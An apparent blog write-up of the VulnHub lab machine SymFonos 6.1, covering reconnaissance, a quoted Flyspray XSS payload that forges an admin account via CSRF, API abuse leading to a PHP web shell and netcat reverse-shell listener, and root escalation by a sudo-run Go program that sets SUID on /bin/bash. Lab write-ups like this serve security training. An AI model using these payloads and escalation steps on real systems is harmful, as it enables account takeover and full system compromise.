---
layout: single
title: SymFonos 6.1 - VulnHub
excerpt: "In this machine, we are exploiting XSS to perform CSRF and abusing APIs to achieve RCE. Additionally, we are taking advantage of a Golang binary with sudoers configuration."
date: 2025-03-30
classes: wide
header:
  teaser: /img2/symfonos.png
  teaser_home_page: true
  icon: /img2/vulnhub.png
categories:
  - vulnhub
  - Linux
  - Medium
tags:
  - XSS
  - CSRF
  - API
  - RCE
  - Sudoers
---

![](/img2/Pasted%20image%2020250330203620.png)

## Introduction

> In this machine, we are exploiting XSS to perform CSRF and abusing APIs to achieve RCE. Additionally, we are taking advantage of a Golang binary with sudoers configuration.

## Reconnaissance

- Nmap 

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 192.168.1.151
```

![](/img2/Pasted%20image%2020250326213333.png)

- Whatweb

```bash
whatweb http://192.168.1.151/
```

![](/img2/Pasted%20image%2020250330164744.png)

- Gobuster

```bash
gobuster dir -u http://192.168.1.151/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50
```

![](/img2/Pasted%20image%2020250326213738.png)

## Exploitation

- Searchsploit

```bash
searchsploit flyspray
```

![](/img2/Pasted%20image%2020250330165304.png)

```bash
searchsploit -m php/webapps/41918.txt
```

```javascript
var tok = document.getElementsByName('csrftoken')[0].value;

var txt = '<form method="POST" id="hacked_form"action="index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hacker"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="root"/>'
txt += '<input type="hidden" name="email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'

var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();
```

- Detect XXS in register pannel

![](/img2/Pasted%20image%2020250330164929.png)

![](/img2/Pasted%20image%2020250330165021.png)

- XSS -> CSRF

![](/img2/Pasted%20image%2020250330165707.png)

```bash
python3 -m http.server 80
```

![](/img2/Pasted%20image%2020250330170323.png)

- Login with new admin user

![](/img2/Pasted%20image%2020250330171420.png)

- Login into Gitea with achilles credentials and check the repositories

![](/img2/Pasted%20image%2020250330174817.png)

> If you don't know php you can use chatgpt 

![](/img2/Pasted%20image%2020250330175004.png)

- Discover endpoints in symfonos-api repository

![](/img2/Pasted%20image%2020250330185623.png)

- Endpoint /ls2o4g/v1.0/ping

![](/img2/Pasted%20image%2020250330184541.png)

- Endpoint /ls2o4g/v1.0/auth/login

![](/img2/Pasted%20image%2020250330184730.png)

- Endpoint /ls2o4g/v1.0/auth/check

![](/img2/Pasted%20image%2020250330184012.png)

![](/img2/Pasted%20image%2020250330184908.png)

- Endpoint /ls2o4g/v1.0/posts/

![](/img2/Pasted%20image%2020250330190437.png)

- Endpoint /ls2o4g/v1.0/posts/

![](/img2/Pasted%20image%2020250330190526.png)

- Endpoint /ls2o4g/v1.0/posts/{id}

![](/img2/Pasted%20image%2020250330190609.png)

- Endpoint /ls2o4g/v1.0/posts/{id}

![](/img2/Pasted%20image%2020250330190814.png)

- Endpoint /ls2o4g/v1.0/posts/{id}

![](/img2/Pasted%20image%2020250330190912.png)

- RCE

![](/img2/Pasted%20image%2020250330192302.png)

![](/img2/Pasted%20image%2020250330192349.png)

- WebShell

```bash
base64 shell.php
```

![](/img2/Pasted%20image%2020250330193851.png)

![](/img2/Pasted%20image%2020250330194013.png)

```bash
nc -nlvp 9000
```

## Post-exploitation

- Migrate to achilles user

```bash
su achilles
```

- Check sudoers

```bash
sudo -l
```

![](/img2/Pasted%20image%2020250330201627.png)

- Exploit Go binary sudoers

```go
package main

import (
    "log"
    "os/exec"
)

func main() {

    cmd := exec.Command("chmod", "u+s", "/bin/bash")

    err := cmd.Run()

    if err != nil {
        log.Fatal(err)
    }
}
```

```bash
sudo /usr/local/go/bin/go run bash.go
```

```bash
bash -p
```

![](/img2/Pasted%20image%2020250330201813.png)